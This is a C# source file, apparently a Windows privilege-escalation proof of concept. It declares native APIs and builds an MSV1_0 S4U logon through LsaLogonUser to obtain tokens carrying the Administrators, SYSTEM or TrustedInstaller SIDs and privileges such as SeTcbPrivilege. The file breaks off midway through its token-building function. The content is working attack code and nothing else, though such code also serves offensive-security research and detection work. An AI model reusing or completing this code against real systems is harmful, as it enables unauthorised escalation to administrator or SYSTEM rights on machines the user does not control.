using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Security.Principal;

namespace TcbS4uImpersonationVariant
{
    class TcbS4uImpersonationVariant
    {
        // Windows Definition
        // Windows Enum
        [Flags]
        enum FormatMessageFlags : uint
        {
            FORMAT_MESSAGE_ALLOCATE_BUFFER = 0x00000100,
            FORMAT_MESSAGE_IGNORE_INSERTS = 0x00000200,
            FORMAT_MESSAGE_FROM_STRING = 0x00000400,
            FORMAT_MESSAGE_FROM_HMODULE = 0x00000800,
            FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000,
            FORMAT_MESSAGE_ARGUMENT_ARRAY = 0x00002000
        }

        [Flags]
        enum ProcessAccessFlags : uint
        {
            PROCESS_ALL_ACCESS = 0x001F0FFF,
            Terminate = 0x00000001,
            PROCESS_CREATE_THREAD = 0x00000002,
            PROCESS_VM_OPERATION = 0x00000008,
            PROCESS_VM_READ = 0x00000010,
            PROCESS_VM_WRITE = 0x00000020,
            PROCESS_DUP_HANDLE = 0x00000040,
            PROCESS_CREATE_PROCESS = 0x000000080,
            PROCESS_SET_QUOTA = 0x00000100,
            PROCESS_SET_INFORMATION = 0x00000200,
            PROCESS_QUERY_INFORMATION = 0x00000400,
            PROCESS_QUERY_LIMITED_INFORMATION = 0x00001000,
            SYNCHRONIZE = 0x00100000,
            MAXIMUM_ALLOWED = 0x02000000
        }

        enum SECURITY_IMPERSONATION_LEVEL
        {
            SecurityAnonymous,
            SecurityIdentification,
            SecurityImpersonation,
            SecurityDelegation
        }

        enum SECURITY_LOGON_TYPE
        {
            UndefinedLogonType = 0,
            Interactive = 2,
            Network,
            Batch,
            Service,
            Proxy,
            Unlock,
            NetworkCleartext,
            NewCredentials,
            RemoteInteractive,
            CachedInteractive,
            CachedRemoteInteractive,
            CachedUnlock
        }

        [Flags]
        enum SE_GROUP_ATTRIBUTES : uint
        {
            SE_GROUP_MANDATORY = 0x00000001,
            SE_GROUP_ENABLED_BY_DEFAULT = 0x00000002,
            SE_GROUP_ENABLED = 0x00000004,
            SE_GROUP_OWNER = 0x00000008,
            SE_GROUP_USE_FOR_DENY_ONLY = 0x00000010,
            SE_GROUP_INTEGRITY = 0x00000020,
            SE_GROUP_INTEGRITY_ENABLED = 0x00000040,
            SE_GROUP_RESOURCE = 0x20000000,
            SE_GROUP_LOGON_ID = 0xC0000000
        }

        enum SYSTEM_INFORMATION_CLASS
        {
            SystemBasicInformation = 0x00,
            SystemProcessorInformation = 0x01,
            SystemPerformanceInformation = 0x02,
            SystemTimeOfDayInformation = 0x03,
            SystemPathInformation = 0x04,
            SystemProcessInformation = 0x05,
            SystemCallCountInformation = 0x06,
            SystemDeviceInformation = 0x07,
            SystemProcessorPerformanceInformation = 0x08,
            SystemFlagsInformation = 0x09,
            SystemCallTimeInformation = 0x0A,
            SystemModuleInformation = 0x0B,
            SystemLocksInformation = 0x0C,
            SystemStackTraceInformation = 0x0D,
            SystemPagedPoolInformation = 0x0E,
            SystemNonPagedPoolInformation = 0x0F,
            SystemHandleInformation = 0x10,
            SystemObjectInformation = 0x11,
            SystemPageFileInformation = 0x12,
            SystemVdmInstemulInformation = 0x13,
            SystemVdmBopInformation = 0x14,
            SystemFileCacheInformation = 0x15,
            SystemPoolTagInformation = 0x16,
            SystemInterruptInformation = 0x17,
            SystemDpcBehaviorInformation = 0x18,
            SystemFullMemoryInformation = 0x19,
            SystemLoadGdiDriverInformation = 0x1A,
            SystemUnloadGdiDriverInformation = 0x1B,
            SystemTimeAdjustmentInformation = 0x1C,
            SystemSummaryMemoryInformation = 0x1D,
            SystemMirrorMemoryInformation = 0x1E,
            SystemPerformanceTraceInformation = 0x1F,
            SystemObsolete0 = 0x20,
            SystemExceptionInformation = 0x21,
            SystemCrashDumpStateInformation = 0x22,
            SystemKernelDebuggerInformation = 0x23,
            SystemContextSwitchInformation = 0x24,
            SystemRegistryQuotaInformation = 0x25,
            SystemExtendServiceTableInformation = 0x26,
            SystemPrioritySeperation = 0x27,
            SystemVerifierAddDriverInformation = 0x28,
            SystemVerifierRemoveDriverInformation = 0x29,
            SystemProcessorIdleInformation = 0x2A,
            SystemLegacyDriverInformation = 0x2B,
            SystemCurrentTimeZoneInformation = 0x2C,
            SystemLookasideInformation = 0x2D,
            SystemTimeSlipNotification = 0x2E,
            SystemSessionCreate = 0x2F,
            SystemSessionDetach = 0x30,
            SystemSessionInformation = 0x31,
            SystemRangeStartInformation = 0x32,
            SystemVerifierInformation = 0x33,
            SystemVerifierThunkExtend = 0x34,
            SystemSessionProcessInformation = 0x35,
            SystemLoadGdiDriverInSystemSpace = 0x36,
            SystemNumaProcessorMap = 0x37,
            SystemPrefetcherInformation = 0x38,
            SystemExtendedProcessInformation = 0x39,
            SystemRecommendedSharedDataAlignment = 0x3A,
            SystemComPlusPackage = 0x3B,
            SystemNumaAvailableMemory = 0x3C,
            SystemProcessorPowerInformation = 0x3D,
            SystemEmulationBasicInformation = 0x3E,
            SystemEmulationProcessorInformation = 0x3F,
            SystemExtendedHandleInformation = 0x40,
            SystemLostDelayedWriteInformation = 0x41,
            SystemBigPoolInformation = 0x42,
            SystemSessionPoolTagInformation = 0x43,
            SystemSessionMappedViewInformation = 0x44,
            SystemHotpatchInformation = 0x45,
            SystemObjectSecurityMode = 0x46,
            SystemWatchdogTimerHandler = 0x47,
            SystemWatchdogTimerInformation = 0x48,
            SystemLogicalProcessorInformation = 0x49,
            SystemWow64SharedInformationObsolete = 0x4A,
            SystemRegisterFirmwareTableInformationHandler = 0x4B,
            SystemFirmwareTableInformation = 0x4C,
            SystemModuleInformationEx = 0x4D,
            SystemVerifierTriageInformation = 0x4E,
            SystemSuperfetchInformation = 0x4F,
            SystemMemoryListInformation = 0x50,
            SystemFileCacheInformationEx = 0x51,
            SystemThreadPriorityClientIdInformation = 0x52,
            SystemProcessorIdleCycleTimeInformation = 0x53,
            SystemVerifierCancellationInformation = 0x54,
            SystemProcessorPowerInformationEx = 0x55,
            SystemRefTraceInformation = 0x56,
            SystemSpecialPoolInformation = 0x57,
            SystemProcessIdInformation = 0x58,
            SystemErrorPortInformation = 0x59,
            SystemBootEnvironmentInformation = 0x5A,
            SystemHypervisorInformation = 0x5B,
            SystemVerifierInformationEx = 0x5C,
            SystemTimeZoneInformation = 0x5D,
            SystemImageFileExecutionOptionsInformation = 0x5E,
            SystemCoverageInformation = 0x5F,
            SystemPrefetchPatchInformation = 0x60,
            SystemVerifierFaultsInformation = 0x61,
            SystemSystemPartitionInformation = 0x62,
            SystemSystemDiskInformation = 0x63,
            SystemProcessorPerformanceDistribution = 0x64,
            SystemNumaProximityNodeInformation = 0x65,
            SystemDynamicTimeZoneInformation = 0x66,
            SystemCodeIntegrityInformation = 0x67,
            SystemProcessorMicrocodeUpdateInformation = 0x68,
            SystemProcessorBrandString = 0x69,
            SystemVirtualAddressInformation = 0x6A,
            SystemLogicalProcessorAndGroupInformation = 0x6B,
            SystemProcessorCycleTimeInformation = 0x6C,
            SystemStoreInformation = 0x6D,
            SystemRegistryAppendString = 0x6E,
            SystemAitSamplingValue = 0x6F,
            SystemVhdBootInformation = 0x70,
            SystemCpuQuotaInformation = 0x71,
            SystemNativeBasicInformation = 0x72,
            SystemErrorPortTimeouts = 0x73,
            SystemLowPriorityIoInformation = 0x74,
            SystemBootEntropyInformation = 0x75,
            SystemVerifierCountersInformation = 0x76,
            SystemPagedPoolInformationEx = 0x77,
            SystemSystemPtesInformationEx = 0x78,
            SystemNodeDistanceInformation = 0x79,
            SystemAcpiAuditInformation = 0x7A,
            SystemBasicPerformanceInformation = 0x7B,
            SystemQueryPerformanceCounterInformation = 0x7C,
            SystemSessionBigPoolInformation = 0x7D,
            SystemBootGraphicsInformation = 0x7E,
            SystemScrubPhysicalMemoryInformation = 0x7F,
            SystemBadPageInformation = 0x80,
            SystemProcessorProfileControlArea = 0x81,
            SystemCombinePhysicalMemoryInformation = 0x82,
            SystemEntropyInterruptTimingInformation = 0x83,
            SystemConsoleInformation = 0x84,
            SystemPlatformBinaryInformation = 0x85,
            SystemPolicyInformation = 0x86,
            SystemHypervisorProcessorCountInformation = 0x87,
            SystemDeviceDataInformation = 0x88,
            SystemDeviceDataEnumerationInformation = 0x89,
            SystemMemoryTopologyInformation = 0x8A,
            SystemMemoryChannelInformation = 0x8B,
            SystemBootLogoInformation = 0x8C,
            SystemProcessorPerformanceInformationEx = 0x8D,
            SystemCriticalProcessErrorLogInformation = 0x8E,
            SystemSecureBootPolicyInformation = 0x8F,
            SystemPageFileInformationEx = 0x90,
            SystemSecureBootInformation = 0x91,
            SystemEntropyInterruptTimingRawInformation = 0x92,
            SystemPortableWorkspaceEfiLauncherInformation = 0x93,
            SystemFullProcessInformation = 0x94,
            SystemKernelDebuggerInformationEx = 0x95,
            SystemBootMetadataInformation = 0x96,
            SystemSoftRebootInformation = 0x97,
            SystemElamCertificateInformation = 0x98,
            SystemOfflineDumpConfigInformation = 0x99,
            SystemProcessorFeaturesInformation = 0x9A,
            SystemRegistryReconciliationInformation = 0x9B,
            SystemEdidInformation = 0x9C,
            SystemManufacturingInformation = 0x9D,
            SystemEnergyEstimationConfigInformation = 0x9E,
            SystemHypervisorDetailInformation = 0x9F,
            SystemProcessorCycleStatsInformation = 0xA0,
            SystemVmGenerationCountInformation = 0xA1,
            SystemTrustedPlatformModuleInformation = 0xA2,
            SystemKernelDebuggerFlags = 0xA3,
            SystemCodeIntegrityPolicyInformation = 0xA4,
            SystemIsolatedUserModeInformation = 0xA5,
            SystemHardwareSecurityTestInterfaceResultsInformation = 0xA6,
            SystemSingleModuleInformation = 0xA7,
            SystemAllowedCpuSetsInformation = 0xA8,
            SystemDmaProtectionInformation = 0xA9,
            SystemInterruptCpuSetsInformation = 0xAA,
            SystemSecureBootPolicyFullInformation = 0xAB,
            SystemCodeIntegrityPolicyFullInformation = 0xAC,
            SystemAffinitizedInterruptProcessorInformation = 0xAD,
            SystemRootSiloInformation = 0xAE,
            SystemCpuSetInformation = 0xAF,
            SystemCpuSetTagInformation = 0xB0,
            SystemWin32WerStartCallout = 0xB1,
            SystemSecureKernelProfileInformation = 0xB2,
            SystemCodeIntegrityPlatformManifestInformation = 0xB3,
            SystemInterruptSteeringInformation = 0xB4,
            SystemSuppportedProcessorArchitectures = 0xB5,
            SystemMemoryUsageInformation = 0xB6,
            SystemCodeIntegrityCertificateInformation = 0xB7,
            SystemPhysicalMemoryInformation = 0xB8,
            SystemControlFlowTransition = 0xB9,
            SystemKernelDebuggingAllowed = 0xBA,
            SystemActivityModerationExeState = 0xBB,
            SystemActivityModerationUserSettings = 0xBC,
            SystemCodeIntegrityPoliciesFullInformation = 0xBD,
            SystemCodeIntegrityUnlockInformation = 0xBE,
            SystemIntegrityQuotaInformation = 0xBF,
            SystemFlushInformation = 0xC0,
            SystemProcessorIdleMaskInformation = 0xC1,
            SystemSecureDumpEncryptionInformation = 0xC2,
            SystemWriteConstraintInformation = 0xC3,
            SystemKernelVaShadowInformation = 0xC4,
            SystemHypervisorSharedPageInformation = 0xC5,
            SystemFirmwareBootPerformanceInformation = 0xC6,
            SystemCodeIntegrityVerificationInformation = 0xC7,
            SystemFirmwarePartitionInformation = 0xC8,
            SystemSpeculationControlInformation = 0xC9,
            SystemDmaGuardPolicyInformation = 0xCA,
            SystemEnclaveLaunchControlInformation = 0xCB,
            SystemWorkloadAllowedCpuSetsInformation = 0xCC,
            SystemCodeIntegrityUnlockModeInformation = 0xCD,
            SystemLeapSecondInformation = 0xCE,
            SystemFlags2Information = 0xCF,
            SystemSecurityModelInformation = 0xD0,
            SystemCodeIntegritySyntheticCacheInformation = 0xD1,
            MaxSystemInfoClass = 0xD2
        }

        [Flags]
        enum TokenAccessFlags : uint
        {
            TOKEN_ADJUST_DEFAULT = 0x0080,
            TOKEN_ADJUST_GROUPS = 0x0040,
            TOKEN_ADJUST_PRIVILEGES = 0x0020,
            TOKEN_ADJUST_SESSIONID = 0x0100,
            TOKEN_ASSIGN_PRIMARY = 0x0001,
            TOKEN_DUPLICATE = 0x0002,
            TOKEN_EXECUTE = 0x00020000,
            TOKEN_IMPERSONATE = 0x0004,
            TOKEN_QUERY = 0x0008,
            TOKEN_QUERY_SOURCE = 0x0010,
            TOKEN_READ = 0x00020008,
            TOKEN_WRITE = 0x000200E0,
            TOKEN_ALL_ACCESS = 0x000F01FF,
            MAXIMUM_ALLOWED = 0x02000000
        }

        enum TOKEN_INFORMATION_CLASS
        {
            TokenUser = 1,
            TokenGroups,
            TokenPrivileges,
            TokenOwner,
            TokenPrimaryGroup,
            TokenDefaultDacl,
            TokenSource,
            TokenType,
            TokenImpersonationLevel,
            TokenStatistics,
            TokenRestrictedSids,
            TokenSessionId,
            TokenGroupsAndPrivileges,
            TokenSessionReference,
            TokenSandBoxInert,
            TokenAuditPolicy,
            TokenOrigin,
            TokenElevationType,
            TokenLinkedToken,
            TokenElevation,
            TokenHasRestrictions,
            TokenAccessInformation,
            TokenVirtualizationAllowed,
            TokenVirtualizationEnabled,
            TokenIntegrityLevel,
            TokenUIAccess,
            TokenMandatoryPolicy,
            TokenLogonSid,
            MaxTokenInfoClass
        }

        // Windows Struct
        [StructLayout(LayoutKind.Sequential)]
        public struct LSA_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            [MarshalAs(UnmanagedType.LPStr)]
            string Buffer;

            public LSA_STRING(string str)
            {
                Length = 0;
                MaximumLength = 0;
                Buffer = null;
                SetString(str);
            }

            public void SetString(string str)
            {
                if (str.Length > (ushort.MaxValue - 1))
                {
                    throw new ArgumentException("String too long for UnicodeString");
                }

                Length = (ushort)(str.Length);
                MaximumLength = (ushort)(str.Length + 1);
                Buffer = str;
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct LUID
        {
            public uint LowPart;
            public uint HighPart;

            public LUID(uint _lowPart, uint _highPart)
            {
                LowPart = _lowPart;
                HighPart = _highPart;
            }
        }


        class MSV1_0_S4U_LOGON : IDisposable
        {
            [StructLayout(LayoutKind.Sequential)]
            private struct INNER_LSA_UNICODE_STRING
            {
                public ushort Length;
                public ushort MaximumLength;
                public IntPtr Buffer;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct INNER_MSV1_0_S4U_LOGON
            {
                public int MessageType;
                public uint Flags;
                public INNER_LSA_UNICODE_STRING UserPrincipalName;
                public INNER_LSA_UNICODE_STRING DomainName;
            }

            private INNER_MSV1_0_S4U_LOGON msvS4uLogon =
                new INNER_MSV1_0_S4U_LOGON();
            private readonly IntPtr pointer;
            private readonly int length;

            public MSV1_0_S4U_LOGON(uint flags, string upn, string domain)
            {
                byte[] upnBytes = new byte[] { };
                byte[] domainBytes = new byte[] { };
                int MsV1_0S4ULogon = 12;

                msvS4uLogon.MessageType = MsV1_0S4ULogon;
                msvS4uLogon.Flags = flags;

                if (!string.IsNullOrEmpty(upn))
                {
                    upnBytes = Encoding.Unicode.GetBytes(upn);
                    msvS4uLogon.UserPrincipalName.Length =
                        (ushort)upnBytes.Length;
                    msvS4uLogon.UserPrincipalName.MaximumLength =
                        (ushort)(upnBytes.Length + 2);
                }
                else
                {
                    msvS4uLogon.UserPrincipalName.Length = 0;
                    msvS4uLogon.UserPrincipalName.MaximumLength = 0;
                }

                if (!string.IsNullOrEmpty(domain))
                {
                    domainBytes = Encoding.Unicode.GetBytes(domain);
                    msvS4uLogon.DomainName.Length =
                        (ushort)domainBytes.Length;
                    msvS4uLogon.DomainName.MaximumLength =
                        (ushort)(domainBytes.Length + 2);
                }
                else
                {
                    msvS4uLogon.DomainName.Length = 0;
                    msvS4uLogon.DomainName.MaximumLength = 0;
                }

                length = Marshal.SizeOf(msvS4uLogon) +
                    msvS4uLogon.UserPrincipalName.MaximumLength +
                    msvS4uLogon.DomainName.MaximumLength;
                pointer = Marshal.AllocHGlobal(length);
                Marshal.Copy(new byte[length], 0, pointer, length);

                IntPtr pUpnString = new IntPtr(
                    pointer.ToInt64() +
                    Marshal.SizeOf(msvS4uLogon));
                IntPtr pDomainString = new IntPtr(
                    pUpnString.ToInt64() +
                    msvS4uLogon.UserPrincipalName.MaximumLength);

                if (!string.IsNullOrEmpty(upn))
                {
                    Marshal.Copy(upnBytes, 0, pUpnString, upnBytes.Length);
                    msvS4uLogon.UserPrincipalName.Buffer = pUpnString;
                }
                else
                {
                    msvS4uLogon.UserPrincipalName.Buffer = IntPtr.Zero;
                }

                if (!string.IsNullOrEmpty(domain))
                {
                    Marshal.Copy(domainBytes, 0, pDomainString, domainBytes.Length);
                    msvS4uLogon.DomainName.Buffer = pDomainString;
                }
                else
                {
                    msvS4uLogon.DomainName.Buffer = IntPtr.Zero;
                }

                Marshal.StructureToPtr(msvS4uLogon, pointer, true);
            }

            public MSV1_0_S4U_LOGON(string upn, string domain)
            {
                byte[] upnBytes = new byte[] { };
                byte[] domainBytes = new byte[] { };
                int MsV1_0S4ULogon = 12;

                msvS4uLogon.MessageType = MsV1_0S4ULogon;
                msvS4uLogon.Flags = 0;

                if (!string.IsNullOrEmpty(upn))
                {
                    upnBytes = Encoding.Unicode.GetBytes(upn);
                    msvS4uLogon.UserPrincipalName.Length =
                        (ushort)upnBytes.Length;
                    msvS4uLogon.UserPrincipalName.MaximumLength =
                        (ushort)(upnBytes.Length + 2);
                }
                else
                {
                    msvS4uLogon.UserPrincipalName.Length = 0;
                    msvS4uLogon.UserPrincipalName.MaximumLength = 0;
                }

                if (!string.IsNullOrEmpty(domain))
                {
                    domainBytes = Encoding.Unicode.GetBytes(domain);
                    msvS4uLogon.DomainName.Length =
                        (ushort)domainBytes.Length;
                    msvS4uLogon.DomainName.MaximumLength =
                        (ushort)(domainBytes.Length + 2);
                }
                else
                {
                    msvS4uLogon.DomainName.Length = 0;
                    msvS4uLogon.DomainName.MaximumLength = 0;
                }

                length = Marshal.SizeOf(msvS4uLogon) +
                    msvS4uLogon.UserPrincipalName.MaximumLength +
                    msvS4uLogon.DomainName.MaximumLength;
                pointer = Marshal.AllocHGlobal(length);
                Marshal.Copy(new byte[length], 0, pointer, length);

                IntPtr pUpnString = new IntPtr(
                    pointer.ToInt64() +
                    Marshal.SizeOf(msvS4uLogon));
                IntPtr pDomainString = new IntPtr(
                    pUpnString.ToInt64() +
                    msvS4uLogon.UserPrincipalName.MaximumLength);

                if (!string.IsNullOrEmpty(upn))
                {
                    Marshal.Copy(upnBytes, 0, pUpnString, upnBytes.Length);
                    msvS4uLogon.UserPrincipalName.Buffer = pUpnString;
                }
                else
                {
                    msvS4uLogon.UserPrincipalName.Buffer = IntPtr.Zero;
                }

                if (!string.IsNullOrEmpty(domain))
                {
                    Marshal.Copy(domainBytes, 0, pDomainString, domainBytes.Length);
                    msvS4uLogon.DomainName.Buffer = pDomainString;
                }
                else
                {
                    msvS4uLogon.DomainName.Buffer = IntPtr.Zero;
                }

                Marshal.StructureToPtr(msvS4uLogon, pointer, true);
            }

            public void Dispose()
            {
                Marshal.FreeHGlobal(pointer);
            }

            public IntPtr Pointer()
            {
                return pointer;
            }

            public int Length()
            {
                return length;
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct QUOTA_LIMITS
        {
            public uint PagedPoolLimit;
            public uint NonPagedPoolLimit;
            public uint MinimumWorkingSetSize;
            public uint MaximumWorkingSetSize;
            public uint PagefileLimit;
            public long TimeLimit;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid; // PSID
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
        {
            public IntPtr Object;
            public IntPtr UniqueProcessId;
            public IntPtr HandleValue;
            public int GrantedAccess;
            public short CreatorBackTraceIndex;
            public short ObjectTypeIndex;
            public int HandleAttributes;
            public int Reserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_GROUPS
        {
            public int GroupCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 32)]
            public SID_AND_ATTRIBUTES[] Groups;

            public TOKEN_GROUPS(int privilegeCount)
            {
                GroupCount = privilegeCount;
                Groups = new SID_AND_ATTRIBUTES[32];
            }
        };

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_MANDATORY_LABEL
        {
            public SID_AND_ATTRIBUTES Label;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_SOURCE
        {

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public byte[] SourceName;
            public LUID SourceIdentifier;

            public TOKEN_SOURCE(string name)
            {
                SourceName = new byte[8];
                Encoding.GetEncoding(1252).GetBytes(name, 0, name.Length, SourceName, 0);
                if (!AllocateLocallyUniqueId(out SourceIdentifier))
                    throw new System.ComponentModel.Win32Exception();
            }
        }

        // Windows API
        /*
         * advapi32.dll
         */
        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool AllocateLocallyUniqueId(out LUID Luid);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSid, out string strSid);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertStringSidToSid(string StringSid, out IntPtr pSid);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern int GetLengthSid(IntPtr pSid);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(
            IntPtr TokenHandle,
            TOKEN_INFORMATION_CLASS TokenInformationClass,
            IntPtr TokenInformation,
            int TokenInformationLength,
            out int ReturnLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        [DllImport("advapi32.dll")]
        static extern int LsaClose(IntPtr PolicyHandle);

        [DllImport("advapi32")]
        public static extern int LsaNtStatusToWinError(int NTSTATUS);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenProcessToken(
            IntPtr hProcess,
            TokenAccessFlags DesiredAccess,
            out IntPtr hToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool SetTokenInformation(
            IntPtr TokenHandle,
            TOKEN_INFORMATION_CLASS TokenInformationClass,
            IntPtr TokenInformation,
            int TokenInformationLength);

        /*
         * kernel32.dll
         */
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr CreateFile(
            string lpFileName,
            FileAccess dwDesiredAccess,
            FileShare dwShareMode,
            IntPtr lpSecurityAttributes,
            FileMode dwCreationDisposition,
            FileAttributes dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool DeviceIoControl(
            IntPtr hDevice,
            uint dwIoControlCode,
            IntPtr InBuffer,
            int nInBufferSize,
            IntPtr OutBuffer,
            int nOutBufferSize,
            IntPtr pBytesReturned,
            IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern int FormatMessage(
            FormatMessageFlags dwFlags,
            IntPtr lpSource,
            int dwMessageId,
            int dwLanguageId,
            StringBuilder lpBuffer,
            int nSize,
            IntPtr Arguments);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern int GetCurrentThreadId();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LocalFree(IntPtr hMem);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(
            ProcessAccessFlags processAccess,
            bool bInheritHandle,
            int processId);

        /*
         * ntdll.dll
         */
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtQuerySystemInformation(
            SYSTEM_INFORMATION_CLASS SystemInformationClass,
            IntPtr SystemInformation,
            int SystemInformationLength,
            ref int ReturnLength);

        /*
         * secur32.dll
         */
        [DllImport("secur32.dll", SetLastError = false)]
        static extern int LsaConnectUntrusted(out IntPtr LsaHandle);

        [DllImport("secur32.dll", SetLastError = false)]
        public static extern int LsaFreeReturnBuffer(IntPtr buffer);

        [DllImport("Secur32.dll", SetLastError = true)]
        static extern int LsaLogonUser(
            IntPtr LsaHandle,
            ref LSA_STRING OriginName,
            SECURITY_LOGON_TYPE LogonType,
            uint AuthenticationPackage,
            IntPtr AuthenticationInformation,
            int AuthenticationInformationLength,
            IntPtr /*ref TOKEN_GROUPS*/ pLocalGroups,
            ref TOKEN_SOURCE SourceContext,
            out IntPtr ProfileBuffer,
            out int ProfileBufferLength,
            out LUID LogonId,
            IntPtr /*out IntPtr Token*/ pToken,
            out QUOTA_LIMITS Quotas,
            out int SubStatus);

        [DllImport("Secur32.dll", SetLastError = true)]
        static extern int LsaLookupAuthenticationPackage(
            IntPtr LsaHandle,
            ref LSA_STRING PackageName,
            out uint AuthenticationPackage);

        // Windows Consts
        const int STATUS_SUCCESS = 0;
        static readonly int STATUS_INFO_LENGTH_MISMATCH = Convert.ToInt32("0xC0000004", 16);
        const int ERROR_BAD_LENGTH = 0x00000018;
        const int ERROR_INSUFFICIENT_BUFFER = 0x0000007A;
        static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
        const string MSV1_0_PACKAGE_NAME = "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0";
        const string LOCAL_SYSTEM_RID = "S-1-5-18";
        const string DOMAIN_ALIAS_RID_ADMINS = "S-1-5-32-544";
        const string TRUSTED_INSTALLER_RID = "S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464";

        // User define Consts
        [Flags]
        enum SepTokenPrivilegesFlags : ulong
        {
            CREATE_TOKEN = 0x0000000000000004UL, // SeCreateTokenPrivilege
            ASSIGNPRIMARYTOKEN = 0x0000000000000008UL, // SeAssignPrimaryTokenPrivilege
            LOCK_MEMORY = 0x0000000000000010UL, // SeLockMemoryPrivilege
            INCREASE_QUOTA = 0x0000000000000020UL, // SeIncreaseQuotaPrivilege
            MACHINE_ACCOUNT = 0x0000000000000040UL, // SeMachineAccountPrivilege
            TCB = 0x0000000000000080UL, // SeTcbPrivilege
            SECURITY = 0x0000000000000100UL, // SeSecurityPrivilege
            TAKE_OWNERSHIP = 0x0000000000000200UL, // SeTakeOwnershipPrivilege
            LOAD_DRIVER = 0x0000000000000400UL, // SeLoadDriverPrivilege
            SYSTEM_PROFILE = 0x0000000000000800UL, // SeSystemProfilePrivilege
            SYSTEMTIME = 0x0000000000001000UL, // SeSystemtimePrivilege
            PROFILE_SINGLE_PROCESS = 0x0000000000002000UL, // SeProfileSingleProcessPrivilege
            INCREASE_BASE_PRIORITY = 0x0000000000004000UL, // SeIncreaseBasePriorityPrivilege
            CREATE_PAGEFILE = 0x0000000000008000UL, // SeCreatePagefilePrivilege
            CREATE_PERMANENT = 0x0000000000010000UL, // SeCreatePermanentPrivilege
            BACKUP = 0x0000000000020000UL, // SeBackupPrivilege
            RESTORE = 0x0000000000040000UL, // SeRestorePrivilege
            SHUTDOWN = 0x0000000000080000UL, // SeShutdownPrivilege
            DEBUG = 0x0000000000100000UL, // SeDebugPrivilege
            AUDIT = 0x0000000000200000UL, // SeAuditPrivilege
            SYSTEM_ENVIRONMENT = 0x0000000000400000UL, // SeSystemEnvironmentPrivilege
            CHANGE_NOTIFY = 0x0000000000800000UL, // SeChangeNotifyPrivilege
            REMOTE_SHUTDOWN = 0x0000000001000000UL, // SeRemoteShutdownPrivilege
            UNDOCK = 0x0000000002000000UL, // SeUndockPrivilege
            SYNC_AGENT = 0x0000000004000000UL, // SeSyncAgentPrivilege
            ENABLE_DELEGATION = 0x0000000008000000UL, // SeEnableDelegationPrivilege
            MANAGE_VOLUME = 0x0000000010000000UL, // SeManageVolumePrivilege
            IMPERSONATE = 0x0000000020000000UL, // SeImpersonatePrivilege
            CREATE_GLOBAL = 0x0000000040000000UL, // SeCreateGlobalPrivilege
            TRUSTED_CREDMAN_ACCESS = 0x0000000080000000UL, // SeTrustedCredManAccessPrivilege
            RELABEL = 0x0000000100000000UL, // SeRelabelPrivilege
            INCREASE_WORKING_SET = 0x0000000200000000UL, // SeIncreaseWorkingSetPrivilege
            TIME_ZONE = 0x0000000400000000UL, // SeTimeZonePrivilege
            CREATE_SYMBOLIC_LINK = 0x0000000800000000UL, // SeCreateSymbolicLinkPrivilege
            DELEGATE_SESSION_USER_IMPERSONATE = 0x0000001000000000UL, // SeDelegateSessionUserImpersonatePrivilege
            ALL = 0x0000001FFFFFFFFCUL
        }

        // User define functions
        static IntPtr GetMsvS4uLogonToken(
            string username,
            string domain,
            SECURITY_LOGON_TYPE type)
        {
            int error;
            int ntstatus;
            var pkgName = new LSA_STRING(MSV1_0_PACKAGE_NAME);
            var tokenSource = new TOKEN_SOURCE("User32");

            Console.WriteLine("[>] Trying to MSV S4U logon.");

            ntstatus = LsaConnectUntrusted(out IntPtr hLsa);

            if (ntstatus != STATUS_SUCCESS)
            {
                error = LsaNtStatusToWinError(ntstatus);
                Console.WriteLine("[-] Failed to connect lsa store.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return IntPtr.Zero;
            }

            ntstatus = LsaLookupAuthenticationPackage(
                hLsa,
                ref pkgName,
                out uint authnPkg);

            if (ntstatus != STATUS_SUCCESS)
            {
                error = LsaNtStatusToWinError(ntstatus);
                Console.WriteLine("[-] Failed to lookup auth package.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
                LsaClose(hLsa);

                return IntPtr.Zero;
            }

            if (!ConvertStringSidToSid(
                DOMAIN_ALIAS_RID_ADMINS,
                out IntPtr pAdminGroup))
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to get Administrator domain SID.");
